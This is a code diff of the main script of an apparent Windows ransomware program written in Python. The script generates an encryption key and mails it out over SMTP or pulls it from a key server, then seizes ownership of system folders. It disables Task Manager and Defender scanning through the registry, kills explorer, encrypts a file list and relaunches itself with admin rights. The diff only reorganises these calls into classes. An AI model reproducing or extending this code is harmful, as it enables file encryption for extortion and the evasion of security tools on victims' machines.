@@ -6,47 +6,40 @@ import tkinter as tk
 from cryptography.fernet import Fernet
 from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
-from modules.system import killproc, delproc, regedit, cpysrc, service
+from modules.system import killproc, delproc, regedit, cpysrc
 from modules.network import host_connect, sendkey_smtp, keyserver
 import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
 # ENVIRONMENT VARIABLE
 usr = os.environ["USERNAME"]
+# INIT VARIABLE TO CALL THE FUNCTION INTO THE CLASS
+gt = takeown.GetOwn()
+gr = icacls.GetPermission()
+dr = delproc.Remove()
+dk = delproc.Kill()
+cp = cpysrc.CopyGui()
+rkey = regedit.ManageKey()
+# MAIN
 if(get_admin_rights.is_admin()):
     if host_connect.keyrcv():
         keyserver.getcrypt()
     else:
         crypt.genkey(usr)
         sendkey_smtp.send_key()
-        takeown.process()
-        takeown.exp()
-        takeown.perf()
-        takeown.perfall()
-        takeown.sysDir()
-        icacls.perf()
-        icacls.perfall()
-        icacls.sysDir()
-        cpysrc.cp_guitmp()
-        regedit.delInit()
+        gt.proc()
+        gr.proc()
+        dk.smart()
+        dr.stsk()
+        rkey.setkey()
+        rkey.delkey()
         regedit.setInit()
-        regedit.noRun()
-        regedit.spy()
-        regedit.scanRtime()
-        regedit.bMonitor()
-        regedit.onAccess()
-        icacls.exp()
-        icacls.pshll()
-        icacls.sys32()
-        delproc.tskmgr()
-        killproc.smart()
-        delproc.smart()
-        delproc.pwsst()
+        gt.dir()
+        gr.dir()
+        cp.cp_guitmp()
         crypt.filelist()
-        cpysrc.cp_cmd()
-        cpysrc.cp_gui()
-        regedit.delcmd()
-        regedit.setCmd()
-        killproc.exp()
-        delproc.exp()
+        cp.cp_gui()
+        dk.exp()
+        time.sleep(1)
+        dr.exp()
 else:
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
 # REBOOT WINDOWS
